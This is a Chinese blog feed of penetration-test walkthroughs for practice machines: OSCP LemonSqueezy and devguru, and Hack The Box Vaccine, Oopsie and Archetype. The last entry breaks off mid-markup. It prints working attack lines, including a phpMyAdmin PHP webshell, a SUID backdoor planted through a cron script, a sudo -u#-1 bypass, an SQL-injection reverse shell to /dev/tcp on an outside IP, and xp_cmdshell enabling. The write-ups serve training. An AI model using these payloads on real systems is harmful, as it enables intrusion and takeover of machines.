        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机-LemonSqueezy"><a href="#【OSCP系列】OSCP靶机-LemonSqueezy" class="headerlink" title="【OSCP系列】OSCP靶机-LemonSqueezy"></a>【OSCP系列】OSCP靶机-LemonSqueezy</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-LemonSqueezy/image-20240721193710744.png" alt="image-20240721193710744"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721193803205.png" alt="image-20240721193803205"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721193853109.png" alt="image-20240721193853109"></p><p>只有一个80端口</p><p>3、版本系统探测</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721194004016.png" alt="image-20240721194004016"></p><p>80端口http的apache服务，系统疑似linux 3或linux 4版本，可能存在脏牛提取漏洞</p><p>4、漏洞探测</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p 80 192.168.31.71</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721194310067.png" alt="image-20240721194310067"></p><p>找到一些可能的csrf 漏洞</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721194334838.png" alt="image-20240721194334838"></p><p>还做了一些目录扫描，这里有很多感兴趣的目录</p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><p>对根目录先做一个扫描</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721194909005.png" alt="image-20240721194909005"></p><h3 id="1、wordpress信息收集"><a href="#1、wordpress信息收集" class="headerlink" title="1、wordpress信息收集"></a>1、wordpress信息收集</h3><p>1、wpscan 工具找用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ --enumerate u</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721195901728.png" alt="image-20240721195901728"></p><p>2、用 <code>cewl</code>生成密码</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721200047471.png" alt="image-20240721200047471"></p><p>3、尝试wpscan 爆破密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ -P pass.txt --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721200324539.png" alt="image-20240721200324539"></p><p>爆破失败；尝试使用大字典进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ -P /usr/share/wordlists/rockyou.txt --usernames user.txt</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721212623527.png" alt="image-20240721212623527"></p><p>这里一直在跑，需要等待了</p><p>4、源码查看</p><p>目录扫描中，有一个tar.gz 文件，下载并解压</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721201601529.png" alt="image-20240721201601529"></p><p>没有<code>wp-config.php</code>文件，但是有个<code>wp-config-sample.php</code>文件，本想着能找到账号密码，但是结果是这样的</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721212437529.png" alt="image-20240721212437529"></p><p>5、登陆wordpress 后台</p><p>我们对用户名进行分开爆破，第二个用户很快爆破出来密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.31.71/wordpress/ -P /usr/share/wordlists/rockyou.txt --usernames &quot;orange&quot;</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721213301924.png" alt="image-20240721213301924"></p><p>进入后台，有一篇<code>orange</code>本人发表的文章；且名字可疑</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721213659327.png" alt="image-20240721213659327"></p><p><img src="/img/OSCP-LemonSqueezy/image-20240721213723346.png" alt="image-20240721213723346"></p><p><img src="/img/OSCP-LemonSqueezy/image-20240721213749683.png" alt="image-20240721213749683"></p><p>噢，保持这个安全，这个怕是某个密码</p><p>本来还想ssh 尝试爆破，但是突然想到这个靶场只有80端口</p><h3 id="2、phpmyadmin信息收集"><a href="#2、phpmyadmin信息收集" class="headerlink" title="2、phpmyadmin信息收集"></a>2、phpmyadmin信息收集</h3><p>利用上面的账号密码在phpmyadmin进行登陆，登陆成功</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721214432676.png" alt="image-20240721214432676"></p><p>尝试日志getshell</p><p>但是想到不是root用户，似乎没有权限</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721214748196.png" alt="image-20240721214748196"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>尝试在phpmyadmin后台写入webshell文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php system($_GET[&#x27;shell&#x27;]); ?&gt;&quot; into outfile &quot;/var/www/html/wordpress/shell.php&quot; </span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-LemonSqueezy/image-20240721214852097.png" alt="image-20240721214852097"></p><p>执行成功；尝试执行命令；执行成功</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721215036637.png" alt="image-20240721215036637"></p><p>反弹shell</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721220243106.png" alt="image-20240721220243106"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p>1、信息收集</p><p>进来之后看到了备份文件中没有的<code>wp-config.php</code>文件</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721220413052.png" alt="image-20240721220413052"></p><p>重新看到了数据库的账号密码</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721220543049.png" alt="image-20240721220543049"></p><p>2、计划任务</p><p>查看计划任务发现最后有一个可疑的点</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721221511558.png" alt="image-20240721221511558"></p><p>居然是一个777 的可写可执行文件</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721221623748.png" alt="image-20240721221623748"></p><p>写入一个后门，如<code>/bin/bash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;chmod +s /bin/bash&#x27; &gt; /etc/logrotate.d/logrotate</span><br></pre></td></tr></table></figure><p>之后等待<code>/bin/bash</code>变成suid 文件</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721223650413.png" alt="image-20240721223650413"></p><p>3、提权至root</p><p><img src="/img/OSCP-LemonSqueezy/image-20240721223739692.png" alt="image-20240721223739692"></p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【OSCP系列】OSCP靶机—devguru</title>
      <link href="/2024/07/20/OSCP-devguru/"/>
      <url>/2024/07/20/OSCP-devguru/</url>
      
        <content type="html"><![CDATA[<h1 id="【OSCP系列】OSCP靶机—devguru"><a href="#【OSCP系列】OSCP靶机—devguru" class="headerlink" title="【OSCP系列】OSCP靶机—devguru"></a>【OSCP系列】OSCP靶机—devguru</h1><h2 id="一、主机发现"><a href="#一、主机发现" class="headerlink" title="一、主机发现"></a>一、主机发现</h2><p><img src="/img/OSCP-devguru/image-20240718222512239.png" alt="image-20240718222512239"></p><h2 id="二、端口扫描"><a href="#二、端口扫描" class="headerlink" title="二、端口扫描"></a>二、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/OSCP-devguru/image-20240718222557792.png" alt="image-20240718222557792"></p><p>2、全端口扫描</p><p><img src="/img/OSCP-devguru/image-20240718222625989.png" alt="image-20240718222625989"></p><p>3、服务版本探测</p><p><img src="/img/OSCP-devguru/image-20240718222853251.png" alt="image-20240718222853251"></p><p>4、漏洞探测</p><p><img src="/img/OSCP-devguru/image-20240718223139900.png" alt="image-20240718223139900"></p><p>发现git泄露，还有些许目录扫描</p><p><img src="/img/OSCP-devguru/image-20240718223204843.png" alt="image-20240718223204843"></p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><p>1、首页</p><p><img src="/img/OSCP-devguru/image-20240718223301889.png" alt="image-20240718223301889"></p><p>2、进行目录扫描</p><p><img src="/img/OSCP-devguru/image-20240718223545789.png" alt="image-20240718223545789"></p><p>3、git信息收集</p><p><img src="/img/OSCP-devguru/image-20240718223713078.png" alt="image-20240718223713078"></p><p>看来是网站的源代码</p><p><img src="/img/OSCP-devguru/image-20240718223759453.png" alt="image-20240718223759453"></p><p>查找敏感文件</p><p><img src="/img/OSCP-devguru/image-20240718224102475.png" alt="image-20240718224102475"></p><p>这里记录了数据库的账号密码</p><p><img src="/img/OSCP-devguru/image-20240718224144444.png" alt="image-20240718224144444"></p><p>4、Adminer登陆</p><p><img src="/img/OSCP-devguru/image-20240718224931376.png" alt="image-20240718224931376"></p><p>看数据库的用户信息</p><p><img src="/img/OSCP-devguru/image-20240718225450025.png" alt="image-20240718225450025"></p><p>用john 对这个密码进行破解</p><p><img src="/img/OSCP-devguru/image-20240718231547556.png" alt="image-20240718231547556"></p><p>爆破时间太长了，感觉没结果，不过看到是bcrypt 加密方法，是否可以更新密码呢</p><p>5、登陆后台</p><p>对用户的密码进行更改</p><p><img src="/img/OSCP-devguru/image-20240718231900908.png" alt="image-20240718231900908"></p><p>更改密码</p><p><img src="/img/OSCP-devguru/image-20240718232004534.png" alt="image-20240718232004534"></p><p>找到后台进行登陆</p><p><img src="/img/OSCP-devguru/image-20240718232043073.png" alt="image-20240718232043073"></p><p>进入后台</p><p><img src="/img/OSCP-devguru/image-20240718232127776.png" alt="image-20240718232127776"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p>1、查找信息</p><p><img src="/img/OSCP-devguru/image-20240718232855445.png" alt="image-20240718232855445"></p><p>这个地方看来可以执行代码，但是不知道用那种语言；看其他的地方，这里有个模板可用</p><p><img src="/img/OSCP-devguru/image-20240718232830942.png" alt="image-20240718232830942"></p><p>使用，写入webshell，上面进行保存</p><p><img src="/img/OSCP-devguru/image-20240718233315302.png" alt="image-20240718233315302"></p><p>尝试执行命令；执行成功</p><p><img src="/img/OSCP-devguru/image-20240718233410162.png" alt="image-20240718233410162"></p><p>进行shell反弹</p><p><img src="/img/OSCP-devguru/image-20240719004234288.png" alt="image-20240719004234288"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、提权至frank"><a href="#1、提权至frank" class="headerlink" title="1、提权至frank"></a>1、提权至frank</h3><p>1、翻找敏感文件</p><p><img src="/img/OSCP-devguru/image-20240719005210553.png" alt="image-20240719005210553"></p><p>似乎是什么备份文件</p><p>2、将这几个文件下载下来</p><p>这个<code>app.ini.bak</code>文件好像是某个配置文件，价值可能更大</p><p><img src="/img/OSCP-devguru/image-20240720133233489.png" alt="image-20240720133233489"></p><p>3、查看内容</p><p><img src="/img/OSCP-devguru/image-20240720133314456.png" alt="image-20240720133314456"></p><p>通过浏览，确实是配置文件，进行筛选，看有无密码信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat app.ini.bak | grep -C 10 pass</span><br></pre></td></tr></table></figure><p>我们通过grep 命令，筛选 有关 pass 的条数，并上下浮动10行；可以看到这里有mysql 数据库的其他账号密码</p><p><img src="/img/OSCP-devguru/image-20240720134122583.png" alt="image-20240720134122583"></p><p>以及疑似有redis 数据库的存在</p><p><img src="/img/OSCP-devguru/image-20240720134239196.png" alt="image-20240720134239196"></p><p>去靶机中看下是否有redis 的进程</p><p><img src="/img/OSCP-devguru/image-20240720134407879.png" alt="image-20240720134407879"></p><p>没有；不过我们拿到了mysql 数据库的其他账号信息</p><p>4、重新登陆MySQL</p><p>注意，下面这个才是用户的密码</p><p><img src="/img/OSCP-devguru/image-20240720134747779.png" alt="image-20240720134747779"></p><p>登陆进来</p><p><img src="/img/OSCP-devguru/image-20240720134803091.png" alt="image-20240720134803091"></p><p>在<code>user</code>表中看到<code>frank</code>用户的信息</p><p><img src="/img/OSCP-devguru/image-20240720134938730.png" alt="image-20240720134938730"></p><p>不过这个密码奇怪的很，不知道是哪种加密方法；后面的<code>passwd_hash_algo</code>给出了加密方式<code>pbkdf2</code></p><p><img src="/img/OSCP-devguru/image-20240720135645239.png" alt="image-20240720135645239"></p><p>本来还想尝试用<code>pbkdf2</code>的加密方式对密码进行修改的，结果一看，这个加密方式不仅需要有盐，还需要key，麻烦了很</p><p><img src="/img/OSCP-devguru/image-20240720140346345.png" alt="image-20240720140346345"></p><p>在<code>app.ini.bak</code>中提到过密码的加密方式，有我们用过的<code>bcrypt</code>加密方法 </p><p><img src="/img/OSCP-devguru/image-20240720140444298.png" alt="image-20240720140444298"></p><p>我们直接把数据库的加密方法一同改掉</p><p><img src="/img/OSCP-devguru/image-20240720140721959.png" alt="image-20240720140721959"></p><p>5、登陆后台</p><p>这里的后台在8585端口上，是一个Gitea 的私人仓库</p><p><img src="/img/OSCP-devguru/image-20240720141148502.png" alt="image-20240720141148502"></p><p>直接登陆</p><p><img src="/img/OSCP-devguru/image-20240720141207760.png" alt="image-20240720141207760"></p><p>成功登陆后台</p><p><img src="/img/OSCP-devguru/image-20240720141228082.png" alt="image-20240720141228082"></p><p>6、提权至frank</p><p><img src="/img/OSCP-devguru/image-20240720141511405.png" alt="image-20240720141511405"></p><p>这里显示了当前Gitea 的版本号；查找有无该版本的漏洞</p><p><img src="/img/OSCP-devguru/image-20240720141623044.png" alt="image-20240720141623044"></p><p>复制过来利用</p><p><img src="/img/OSCP-devguru/image-20240720141836369.png" alt="image-20240720141836369"></p><p>把他的参数凑齐</p><p><img src="/img/OSCP-devguru/image-20240720142234919.png" alt="image-20240720142234919"></p><p>昂。。。利用失败；简单的看一下这个py 文件，这里的payload好像是写入了某个文件中</p><p><img src="/img/OSCP-devguru/image-20240720154234575.png" alt="image-20240720154234575"></p><p>我们再执行一下（稍多等待一会儿），成功拿到了shell</p><p><img src="/img/OSCP-devguru/image-20240720154426252.png" alt="image-20240720154426252"></p><h3 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h3><p>看下<code>sudo -l</code></p><p><img src="/img/OSCP-devguru/image-20240720154757070.png" alt="image-20240720154757070"></p><p>这里<code>（ALL, !root）</code> 表示所有用户组的 非root用户 可以使用，也就是说，我们不能以root 身份去执行这个东西；尝试一下先</p><p><img src="/img/OSCP-devguru/image-20240720155322195.png" alt="image-20240720155322195"></p><p>当我们想用root 身份运行这个东西是需要密码（这里需要先进入交互式shell）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;;</span><br></pre></td></tr></table></figure><p>这里陷入了僵局，看了下佬的文章说，这里的sudo 是存在漏洞的；具体的解释在 <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version">Linux Privilege Escalation | HackTricks</a></p><p><img src="/img/OSCP-devguru/image-20240720161027048.png" alt="image-20240720161027048"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#-1 /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/img/OSCP-devguru/image-20240720161158437.png" alt="image-20240720161158437"></p><p>存在可能利用风险；我们改变sudo 的利用姿势</p><p><img src="/img/OSCP-devguru/image-20240720161301814.png" alt="image-20240720161301814"></p><p>成功提权至root</p>]]></content>
      
      
      <categories>
          
          <category> OSCP系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Hack The Box系列】Vaccine</title>
      <link href="/2024/07/16/Hackthebox-Vaccine/"/>
      <url>/2024/07/16/Hackthebox-Vaccine/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box系列—Vaccine"><a href="#Hack-The-Box系列—Vaccine" class="headerlink" title="Hack The Box系列—Vaccine"></a>Hack The Box系列—Vaccine</h1><p><img src="/img/Hackthebox-Vaccine/image-20240716150020117.png" alt="image-20240716150020117"></p><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><p>1、快速端口扫描</p><p><img src="/img/Hackthebox-Vaccine/image-20240716150214399.png" alt="image-20240716150214399"></p><p>2、全端口扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p- --min-rate 10000 10.129.235.167</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Vaccine/image-20240716150556995.png" alt="image-20240716150556995"></p><p>这里没有扫描到80端口，可能是扫描速率太快导致</p><h2 id="二、FTP信息收集"><a href="#二、FTP信息收集" class="headerlink" title="二、FTP信息收集"></a>二、FTP信息收集</h2><p>使用ftp 账号空密码登陆成功</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152229763.png" alt="image-20240716152229763"></p><p>发现一个备份的zip 文件，下载查看</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152311187.png" alt="image-20240716152311187"></p><p>尝试解压</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152409356.png" alt="image-20240716152409356"></p><p>需要密码；转换hash 进行爆破</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152527566.png" alt="image-20240716152527566"></p><p>指定密码解压</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152737621.png" alt="image-20240716152737621"></p><h2 id="三、HTTP信息收集"><a href="#三、HTTP信息收集" class="headerlink" title="三、HTTP信息收集"></a>三、HTTP信息收集</h2><p>1、首页</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152805070.png" alt="image-20240716152805070"></p><p>2、是一个登陆页；看从ftp 那里拿到的index.php，应该是这个页面的源码</p><p><img src="/img/Hackthebox-Vaccine/image-20240716152843397.png" alt="image-20240716152843397"></p><p>3、登陆后台</p><p><img src="/img/Hackthebox-Vaccine/image-20240716153005727.png" alt="image-20240716153005727"></p><p><img src="/img/Hackthebox-Vaccine/image-20240716153028838.png" alt="image-20240716153028838"></p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><h3 id="1、SQL注入"><a href="#1、SQL注入" class="headerlink" title="1、SQL注入"></a>1、SQL注入</h3><p>后台这里疑似存在sql注入漏洞</p><p><img src="/img/Hackthebox-Vaccine/image-20240716153430087.png" alt="image-20240716153430087"></p><p>用sqlmap 跑一下</p><p><img src="/img/Hackthebox-Vaccine/image-20240716173446559.png" alt="image-20240716173446559"></p><p>尝试 <code>--os-shell</code> 获取权限</p><p><img src="/img/Hackthebox-Vaccine/image-20240716181500045.png" alt="image-20240716181500045"></p><p>提示我出错，获取不了</p><h3 id="2、getshell"><a href="#2、getshell" class="headerlink" title="2、getshell"></a>2、getshell</h3><p>使用另一种方法，PostgreSQL version 11.5有COPY命令可以利用，尝试在sql 漏洞处写入一句话木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; CREATE TABLE cmd_exec(cmd_output text); --</span><br><span class="line">&#x27;; COPY cmd_exec FROM PROGRAM &#x27;bash -c &quot;bash -i 0&gt; /dev/tcp/10.10.16.76/4444&quot;&#x27;; --</span><br></pre></td></tr></table></figure><blockquote><p>这里的cmd_exec类似于SQL server的xp_cmdshell，可以执行系统命令</p><p>第一句是创建一个表cmd_exec，用来接收执行的命令，第二句是执行一段系统命令来建立反弹shell。</p></blockquote><p>经过尝试，这个shell 无回显，那再做一个反弹</p><p><img src="/img/Hackthebox-Vaccine/image-20240716182145562.png" alt="image-20240716182145562"></p><h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><h3 id="1、提权至postgres"><a href="#1、提权至postgres" class="headerlink" title="1、提权至postgres"></a>1、提权至postgres</h3><p>1、信息收集</p><p>在www目录下找到数据库的账号密码</p><p><img src="/img/Hackthebox-Vaccine/image-20240716183150203.png" alt="image-20240716183150203"></p><p>看是否有这个数据库名的用户</p><p><img src="/img/Hackthebox-Vaccine/image-20240716183348914.png" alt="image-20240716183348914"></p><p>果然有，尝试ssh登陆</p><p><img src="/img/Hackthebox-Vaccine/image-20240716183603564.png" alt="image-20240716183603564"></p><p>成功提权至postgres</p><h3 id="2、提权至root"><a href="#2、提权至root" class="headerlink" title="2、提权至root"></a>2、提权至root</h3><p><img src="/img/Hackthebox-Vaccine/image-20240716183911838.png" alt="image-20240716183911838"></p><p>sudo 使用vi 编辑这个文件</p><p><img src="/img/Hackthebox-Vaccine/image-20240716184604359.png" alt="image-20240716184604359"></p><p>成功提权到root</p><p><img src="/img/Hackthebox-Vaccine/image-20240716184659521.png" alt="image-20240716184659521"></p>]]></content>
      
      
      <categories>
          
          <category> Hackthebox系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Hack The Box系列】Oopsie</title>
      <link href="/2024/07/16/Hackthebox-Oopsie/"/>
      <url>/2024/07/16/Hackthebox-Oopsie/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box系列—Oopsie"><a href="#Hack-The-Box系列—Oopsie" class="headerlink" title="Hack The Box系列—Oopsie"></a>Hack The Box系列—Oopsie</h1><p><img src="/img/Hackthebox-Oopsie/image-20240716150033322.png" alt="image-20240716150033322"></p><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/Hackthebox-Oopsie/image-20240715172908789.png" alt="image-20240715172908789"></p><p>2、全端口扫描</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173042498.png" alt="image-20240715173042498"></p><p>3、漏洞扫描</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173553044.png" alt="image-20240715173553044"></p><h2 id="二、HTTP信息收集"><a href="#二、HTTP信息收集" class="headerlink" title="二、HTTP信息收集"></a>二、HTTP信息收集</h2><p><img src="/img/Hackthebox-Oopsie/image-20240715173614805.png" alt="image-20240715173614805"></p><p>1、http源代码查看</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173822857.png" alt="image-20240715173822857"></p><p>2、登陆页</p><p><img src="/img/Hackthebox-Oopsie/image-20240715173942308.png" alt="image-20240715173942308"></p><h2 id="三、Getshell"><a href="#三、Getshell" class="headerlink" title="三、Getshell"></a>三、Getshell</h2><h3 id="1、越权"><a href="#1、越权" class="headerlink" title="1、越权"></a>1、越权</h3><p>尝试弱口令不行之后，通过游客身份进入，找到一个文件上传的地方，提示需要admin权限</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174144073.png" alt="image-20240715174144073"></p><p>回到账户信息这儿</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174246674.png" alt="image-20240715174246674"></p><p>对id 号进行遍历</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174821290.png" alt="image-20240715174821290"></p><p>发现管理员和超级管理员</p><p><img src="/img/Hackthebox-Oopsie/image-20240715174942277.png" alt="image-20240715174942277"></p><p>当然是使用超级管理员的权限了；我们需要记住超级管理员的ID号和名字，之后伪造cookie</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175205817.png" alt="image-20240715175205817"></p><p>拦截Uploads 的请求页面进行cookie伪造</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175317794.png" alt="image-20240715175317794"></p><p>之后放包，出来上传页面</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175338382.png" alt="image-20240715175338382"></p><h3 id="2、文件上传getshell"><a href="#2、文件上传getshell" class="headerlink" title="2、文件上传getshell"></a>2、文件上传getshell</h3><p>把php反弹shell 的文件拿过来</p><img src="/img/Hackthebox-Oopsie/image-20240715175516377.png" alt="image-20240715175516377" style="zoom:150%;" /><p>更改成自己的IP和端口，之后用nc 进行监听</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175602005.png" alt="image-20240715175602005"></p><p>注意，上传过程中依然需要抓包改cookie</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175706601.png" alt="image-20240715175706601"></p><p>提示上传成功</p><p><img src="/img/Hackthebox-Oopsie/image-20240715175734909.png" alt="image-20240715175734909"></p><p>那么文件上传的路径在哪儿，凭借感觉，总在某个upload 或 uploads 目录下</p><p><img src="/img/Hackthebox-Oopsie/image-20240715181616228.png" alt="image-20240715181616228"></p><p>成功获取shell</p><h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><h3 id="1、提权到robert"><a href="#1、提权到robert" class="headerlink" title="1、提权到robert"></a>1、提权到robert</h3><p>1、查找敏感文件</p><p><img src="/img/Hackthebox-Oopsie/image-20240715184012118.png" alt="image-20240715184012118"></p><p>发现数据库的账号密码</p><p><img src="/img/Hackthebox-Oopsie/image-20240715184138033.png" alt="image-20240715184138033"></p><p>登陆成功；没找到啥有用的信息，突然想到会不会数据库的密码就是用户的密码</p><p><img src="/img/Hackthebox-Oopsie/image-20240715184958853.png" alt="image-20240715184958853"></p><h3 id="2、提权到root"><a href="#2、提权到root" class="headerlink" title="2、提权到root"></a>2、提权到root</h3><p>1、查找suid 文件</p><p><img src="/img/Hackthebox-Oopsie/image-20240715185258297.png" alt="image-20240715185258297"></p><p>2、尝试运行这个文件</p><p><img src="/img/Hackthebox-Oopsie/image-20240715185433394.png" alt="image-20240715185433394"></p><p>3、利用这个文件可以越权查看文件</p><p><img src="/img/Hackthebox-Oopsie/image-20240715185525361.png" alt="image-20240715185525361"></p><p>4、可以越权查看<code>/etc/shadow</code>之后爆破密码等</p>]]></content>
      
      
      <categories>
          
          <category> Hackthebox系列靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hackthebox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Hack The Box系列】Archetype</title>
      <link href="/2024/07/14/Hackthebox-Archetype/"/>
      <url>/2024/07/14/Hackthebox-Archetype/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-The-Box系列—Archetype"><a href="#Hack-The-Box系列—Archetype" class="headerlink" title="Hack The Box系列—Archetype"></a>Hack The Box系列—Archetype</h1><p><img src="/img/Hackthebox-Archetype/image-20240716150043365.png" alt="image-20240716150043365"></p><h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><p>1、快速扫描</p><p><img src="/img/Hackthebox-Archetype/image-20240714174834523.png" alt="image-20240714174834523"></p><p>2、漏洞探测</p><p><img src="/img/Hackthebox-Archetype/image-20240714181223120.png" alt="image-20240714181223120"></p><p>发现 Microsoft Windows 的 <code>CVE-2008-4250</code>远程代码执行漏洞</p><h2 id="二、SMB信息收集"><a href="#二、SMB信息收集" class="headerlink" title="二、SMB信息收集"></a>二、SMB信息收集</h2><p>空密码进行SMB登陆</p><p><img src="/img/Hackthebox-Archetype/image-20240714181443949.png" alt="image-20240714181443949"></p><p>进行SMB连接</p><p><img src="/img/Hackthebox-Archetype/image-20240714181735993.png" alt="image-20240714181735993"></p><p>似乎是sql 的账号密码</p><p><img src="/img/Hackthebox-Archetype/image-20240714181819976.png" alt="image-20240714181819976"></p><h2 id="三、MSSQL信息收集"><a href="#三、MSSQL信息收集" class="headerlink" title="三、MSSQL信息收集"></a>三、MSSQL信息收集</h2><p>1、连接mssql</p><p>使用impacket包的mssql客户端脚本连接mssql</p><p><img src="/img/Hackthebox-Archetype/image-20240714182506119.png" alt="image-20240714182506119"></p><p>查看数据库的权限</p><h2 id="四、Getshell"><a href="#四、Getshell" class="headerlink" title="四、Getshell"></a>四、Getshell</h2><p><code>xp_cmdshell</code> 可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，是 <code>sql servevr</code> 的原生工具，该扩展存储过程可用于催生Windows命令外壳；我们需要修改配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1; </span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><p>之后执行命令，执行成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &#x27;net user&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/img/Hackthebox-Archetype/image-20240714184901257.png" alt="image-20240714184901257"></p><p>我们利用msf 生成exe 进行上传和执行</p><p><img src="/img/Hackthebox-Archetype/image-20240714185333481.png" alt="image-20240714185333481"></p><p>通过mssql 下载到可下载的目录</p><figure class="highlight 